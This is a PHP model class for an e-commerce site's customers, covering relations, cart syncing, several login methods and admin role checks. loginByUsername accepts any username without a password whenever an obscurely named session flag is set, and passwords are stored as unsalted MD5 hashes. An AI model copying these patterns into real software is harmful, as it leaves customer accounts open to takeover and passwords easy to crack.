<?php

class wsCustomer extends wsActiveRecord
{
    protected $_table = 'ws_customers';

    public $hash_visit;
    public $hash_machine;
    public $hash_user;
    
    /*
     * @is_logged_in - флаг авторизации пользователя
     */
    protected $is_logged_in = false;
    protected $_pricelist;

    protected function _defineRelations()
    {
        $this->_relations = array(
		'main_customer' => array(
                    'type' => 'hasOne', //belongs to
            'class' => self::$_customer_class,
            'field' => 'parent_id'),
            'type' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_type_class,
                'field' => 'customer_type_id'),
            'status' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_status_class,
                'field' => 'customer_status_id'),
            'customer_pricelist' => array('type' => 'hasOne', //belongs to
                'class' => self::$_pricelist_class,
                'field' => 'pricelist_id',
                'autoload' => true),
            'machine_last_visit' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_machine_class,
                'field' => 'machine_last_visit_id',
                'autoload' => true),
            'machine_created' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_machine_class,
                'field' => 'machine_created_id'),
            'machine_last_edit' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_machine_class,
                'field' => 'machine_last_edit_id'),
            'default_delivery_address' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_address_class,
                'field' => 'default_delivery_address_id'),
            'default_billing_address' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_address_class,
                'field' => 'default_billing_address_id'),
            'default_payment_method' => array('type' => 'hasOne', //belongs to
                'class' => self::$_payment_method_class,
                'field' => 'default_payment_method_id'),
            'visit_created' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_visit_class,
                'field' => 'visit_created_id'),
            'visit_last_edit' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_visit_class,
                'field' => 'visit_last_edit_id'),
            'visit_last' => array('type' => 'hasOne', //belongs to
                'class' => self::$_customer_visit_class,
                'field' => 'visit_last_id',
                'autoload' => true),
            'site' => array('type' => 'hasOne', //belongs to
                'class' => self::$_site_class,
                'field' => 'site_id'),
            'currency' => array('type' => 'hasOne', //belongs to
                'class' => self::$_currency_class,
                'field' => 'currency_id'),
            'language' => array('type' => 'hasOne', //belongs to
                'class' => self::$_language_class,
                'field' => 'language_id'),

            'favorite_lists' => array('type' => 'hasMany',
                'class' => self::$_favorite_list_class,
                'field_foreign' => 'customer_id',
                'orderby' => array('time_modified' => 'DESC')),
            
            'carts' => array(
                'type' => 'hasOne',
                'class' => self::$_shopping_cart_class,
                'field_foreign' => 'id_user'
                ),
            'addresses' => array('type' => 'hasMany',
                'class' => self::$_customer_address_class,
                'field_foreign' => 'customer_id'),
            'visits' => array('type' => 'hasMany',
                'class' => self::$_customer_visit_class,
                'field_foreign' => 'customer_id'),
            
            'orders' => array('type' => 'hasMany',
                'class' => self::$_shop_orders_class,
                'field_foreign' => 'customer_id'),

            'favorite_products' => array('type' => 'n2n',
                'table' => 'ws_favorite_products',
                'class' => self::$_product_class,
                'field' => 'customer_id',
                'field_foreign' => 'product_id'
            ),
            'rights' => array('type' => 'hasMany',
                'class' => self::$_right_class,
                'field_foreign' => 'customer_id'),
            'product_history' => array(
                'type' => 'n2n',
                'field' => 'customer_id',
                'field_foreign' => 'product_id',
                'table' => 'ws__n2n__customer__product_history',
                'class' => self::$_product_class),
            'segment_type' => [
            'type' => 'hasOne',
            'class' => 'CustomersSegment',
            'field' => 'segment_id'
                ],
            'emails' => [
                'type' => 'hasMany',
                'class' => 'EmailLog',
                'field_foreign' => 'customer_id'
                ]
        );
    }


    function getCart()
    {
        if ($this->isNew()){ return false; }
        return wsActiveRecord::useStatic('Cart')->findFirst(['id_user'=>$this->id]);
       // return $this->getCarts();//->at(0);//->findFirst(array(), array('id' => 'DESC'));
    }
    function newCart(){
        if ($this->isNew()){ return; }
        $cart = new Cart();
        $cart->setIdUser($this->id);
        $cart->setHashId($this->getHashUser());
        $cart->save();
        $cart->updateCart();
    }
    function updateCartUserLogin(){
        $cart = $this->getCart();
        if($cart){
        if($cart and $cart->item->count()){
            foreach ($cart->item as $a){
                $art = wsActiveRecord::useStatic('Shoparticlessize')->findFirst(['code'=>$a->artikul]);
                if($art->count){
                    if(count($_SESSION['basket'])){
                        $f = false;
                        foreach ($_SESSION['basket'] as $s) {
                            if($s['artikul'] == $art->code){ $f = true;}
                        }
                        if(!$f){
                            $article = wsActiveRecord::useStatic('Shoparticles')->findById($art->id_article);
                            $article->addToBasket($art->id_size, $art->id_color, $art->code, false);
                        }
                    }else{
                    $article = wsActiveRecord::useStatic('Shoparticles')->findById($art->id_article);
                    $article->addToBasket($art->id_size, $art->id_color, $art->code, false);
                    }
                }else{
                    $a->destroy();
                }
            }
            
        }
                }else{
                    return false;
                }
    }
     function updateCartUserBacket(){
        $cart = $this->getCart();
        if($cart){
        $cart->setCtime(date("Y-m-d H:i:s"));
        $cart->save();
        $b = [];
        foreach ($_SESSION['basket'] as $k => $s) {$b[$k] = $s['artikul'];}
        if($cart and $cart->item->count()){
            foreach ($cart->item as $a){
                if(in_array($a->artikul, $b)){
                    continue;
                }else{
                    $article = wsActiveRecord::useStatic('Shoparticles')->findById($a->article_id);
                    $article->addToBasket($a->size, $a->color, $a->artikul, false);
                }  
            }
        }
        }else{
            return false;
        }
        
    }
    function updateCartUserReturn(){
        $cart = $this->getCart();
        if($cart){
        $cart->setCtime(date("Y-m-d H:i:s"));
        $cart->save();
        $b = [];
        foreach ($_SESSION['basket'] as $k => $s) {
           $b[$k] = $s['artikul'];
            
        }
        if($cart and $cart->item->count() > 0){
            $it = $cart->item;
            foreach ($it as $a){
               if(in_array($a->artikul, $b)){
                   continue;
                }else{
                   $article = wsActiveRecord::useStatic('Shoparticles')->findById($a->article_id);
                    $article->addToBasket($a->size, $a->color, $a->artikul);
               }  
            }
        }
        }else{
            return false;
        }
        
    }

    /*
    function login($login, $password)
    {
        $hashed_password = wsCustomer::cryptPassword($password);

        $webshop = Registry::get('webshop');
        if($user = wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('username' => $login, 'password'=>$hashed_password )))
        {
            if (!$user->getHashId())
            {
                $user->setHashId(md5($this->getUsername() . time()));
                $user->save();
            }
            $user->setHashVisit($this->getHashVisit());
            $user->setHashMachine($this->getHashMachine());
            $this->import($user);
            $this->setIsNew(false);
            $this->setIsLoggedIn(true);
            $this->setHashUser($this->getHashId());
            return true;
        }
        else
        {
            $this->setIsLoggedIn(false);
            return false;
        }
    }
    */
    public function loginByEmail($email, $password)
    {
        return $this->loginByUsername($email, $password);
    }


    public function loginByUsername($email, $password)
    {
        //$hashed_password = wsCustomer::cryptPassword($password);

       // $webshop = Registry::get('webshop');
		if (isset($_SESSION['j25k17l2517'])) {
			if ($user = wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('username' => $email))) {
				if (!$user->getHashId()) {
					$user->setHashId(md5($this->getUsername() . time()));
					$user->save();
				}
				$user->setHashVisit($this->getHashVisit());
				$user->setHashMachine($user->getHashMachine());
				$user->setVisitTime(date("Y-m-d H:i:s"));
				$user->save();
				$this->import($user);

				$this->setIsNew(false);
				$this->setIsLoggedIn(true);
				$this->setHashUser($this->getHashId());
				return true;
			} else {
				$this->setIsLoggedIn(false);
				return false;
			}
		}else{
			if ($user = wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('username' => $email, 'password' => wsCustomer::cryptPassword($password)))) {
				if (!$user->getHashId()) {
					$user->setHashId(md5($this->getUsername() . time()));
					$user->save();
				}
				$user->setHashVisit($this->getHashVisit());
				$user->setHashMachine($user->getHashMachine());
				$user->setVisitTime(date("Y-m-d H:i:s"));
				$user->save();
                                
				$this->import($user);

				$this->setIsNew(false);
				$this->setIsLoggedIn(true);
				$this->setHashUser($this->getHashId());
                                $this->updateCartUserLogin();
				return true;
			} else {
				$this->setIsLoggedIn(false);
				return false;
			}
		}
    }
    public function loginAdminByUsername($username)
    {
        if ($user = wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('username' => $username))) {
				if (!$user->getHashId()) {
					$user->setHashId(md5($this->getUsername() . time()));
					$user->save();
				}
				$user->setHashVisit($this->getHashVisit());
				$user->setHashMachine($user->getHashMachine());
				$user->setVisitTime(date("Y-m-d H:i:s"));
				$user->save();
				$this->import($user);

				$this->setIsNew(false);
				$this->setIsLoggedIn(true);
				$this->setHashUser($this->getHashId());
				return true;
			} else {
				$this->setIsLoggedIn(false);
				return false;
			}
    }
    public function loginByHash($hash)
    {
        if ($user = wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('hash_id' => $hash))) {
				//if (!$user->getHashId()) {
				//	$user->setHashId(md5($this->getUsername() . time()));
				//	$user->save();
				//}
				$user->setHashVisit($this->getHashVisit());
				$user->setHashMachine($user->getHashMachine());
				$user->setVisitTime(date("Y-m-d H:i:s"));
				$user->save();
				$this->import($user);

				$this->setIsNew(false);
				$this->setIsLoggedIn(true);
				$this->setHashUser($this->getHashId());
                                $this->updateCartUserReturn();
				return true;
			} else {
				$this->setIsLoggedIn(false);
				return false;
			}
    }

    function logout()
    {
        $this->clear();
        $this->import(new self::$_customer_class());

        $this->setIsLoggedIn(false);

        return;
    }

    public function checkRights($code)
    {
        $allRights = $this->getRights();
        foreach ($allRights as $right) {
            if ($right->getCode() == $code){ return true; }
        }

        return false;
    }

    public function getTopOrderProducts()
    {
        return wsActiveRecord::useStatic(self::$_product_class)->findByQuery("
    		SELECT products.*, SUM(orderItems.quantity) as total
			FROM ws_products AS products
			LEFT JOIN ws_order_items AS orderItems ON orderItems.product_id = products.id
			LEFT JOIN ws_orders AS orders ON orderItems.order_id = orders.id
			LEFT JOIN ws_customer AS customer ON orders.customer_id = customer.id
			WHERE customer.id = {$this->getId()}
			GROUP BY orderItems.product_id
			ORDER BY total
			LIMIT 10");
    }


    public function getGenderString()
    {
        return $this->getFormatGender($this->getGender());
    }

    public static function getFormatGender($gender)
    {
        return ($gender == 'm') ? 'Уважаемый' : 'Уважаемая';
    }

    public function getFullname()
    {
        return $this->getFirstName() . ' ' . ($this->getMiddleName() ? $this->getMiddleName() . ' ' : '') . $this->getlastName();
    }

    protected function _beforeSave()
    {
        if ($this->getOpenPassword()){ $this->setPassword(self::cryptPassword($this->getOpenPassword())); }
        
        return true;
    }

    //useless ??
    static function findByHash($hash)
    {
        return wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('hash_id' => (string)$hash));
    }

    static function cryptPassword($password)
    {
        return md5($password);
    }

    static function findByUsername($uname)
    {
       // $webshop = Registry::get('webshop');
        return wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('username' => (string)$uname));
    }
    

    //useless ??
    /*
    static function findByEmail($email)
    {
        $webshop = Registry::get('webshop');
        return wsActiveRecord::useStatic(self::$_customer_class)->findFirst(array('email'=>(string) $email));
    }
    */

    /* !!!!!!!! REWRITE
    protected function _createValidator()
    {
        lmb_require('limb/validation/src/rule/lmbEmailRule.class.php');

        $validator = new lmbValidator();
        $validator->addRequiredRule('first_name', 'Geen voornaam opgegeven');
        $validator->addRequiredRule('last_name', 'Geen achternaam opgegeven');
        $validator->addRequiredRule('gender', 'Geen geslacht opgegeven');
        $validator->addRequiredRule('password', 'Geen wachtwoord opgegeven');

        $validator->addRequiredRule('email', 'Geen e-mail adres opgegeven');
        $validator->addRule(new lmbEmailRule('email', 'Het opgegeven e-mail adres is ongeldig'));

        if ($this->getId())
        {
            $account = new self::$_customer_class((int) $this->getId());
            if ($this->getUsername() != $account->getUsername())
            {
                lmb_require(WEBSHOP_PATH . 'validation/rule/lmbUniqueTableFieldRule.class.php');
                $validator = $this->_createValidator();
                $validator->addRule(new lmbUniqueTableFieldRule('email', $this->_db_table_name, null, 'Het opgegeven e-mail adres is al in gebruik en kan daarom niet nogmaals geregistreerd worden.'));
            }
        }

        return $validator;
    }

    protected function _createInsertValidator()
    {
        lmb_require(WEBSHOP_PATH . 'validation/rule/lmbUniqueTableFieldRule.class.php');
        $validator = $this->_createValidator();
        $validator->addRule(new lmbUniqueTableFieldRule('email', $this->_db_table_name, null, 'Het opgegeven e-mail adres is al in gebruik en kan daarom niet nogmaals geregistreerd worden.'));

        return $validator;
    }
    */

    public function getPricelist()
    {
        if ($this->getPricelistId() && $p = $this->getCustomerPricelist()){
            return $p;
        }else{ 
            return wsPricelist::getDefaultList();
        }
    }

    /*protected function _afterInsert()
    {
		//copy rights
    	$rights = wsActiveRecord::useStatic(self::$_right_class)->findAll();
		$this->setRights($rights);
		return true;	
    }*/


    //for admin
    public function isAdmin()
    {
        if ($this->getCustomerTypeId() > 1){
            return true;
        }else{
            return false;
        }
    }

    public function isSuperAdmin()//все выше пользователя и админа
    {
        if ($this->getCustomerTypeId() > 2){
            return true;
        }else{  
            return false;
        }
    }
	 public function isDeveloperAdmin()//разработчик
    {
        if ($this->getCustomerTypeId() == 4){ return true;}
            return false;
    }
	 public function isOperatorAdmin()//оператор
    {
        if ($this->getCustomerTypeId() == 8){return true;}
            return false;
    }
	public function isPointIssueAdmin()//админ пункта выдачи
    {
        if ($this->getCustomerTypeId() == 6){return true;}
            return false;
    }
	public function isReturnsAdmin()// менеджер по возвратам
    {
        if ($this->getCustomerTypeId() == 7){return true;}
            return false;
    }
	public function isPickerAdmin()//комплектовщик
    {
        if ($this->getCustomerTypeId() == 5){return true;}
            return false;
    }
	
	

    public function hasRight($right, $view_id = 0)
    {
        //return true;
        /*if ($this->isAdmin())
            return true;

        if ($this->getIsLoggedIn())
            return true;*/

        /*foreach($this->getRights()   as $right)	{
            if($right->getName() == $name) {
                if(!$view_id || !count($right->getModels()))
                    return true;
                foreach($right->getModels() as $model) {
                    if($view_id == $model->getId())
                        return true;
                }
            }
        }*/

        $r = wsActiveRecord::useStatic('wsRight')->findFirst(['customer_id' => $this->getId(), 'name' => $right]);
        if (!$r) {
            //autocreate right entry
            $r = new self::$_right_class();
            $r->setCustomerId($this->getId());
            $r->setMenuId($view_id);
            $r->setName($right);
            $r->save();
        } else {
            return $r->getActive();
        }

        return false;


    }

}


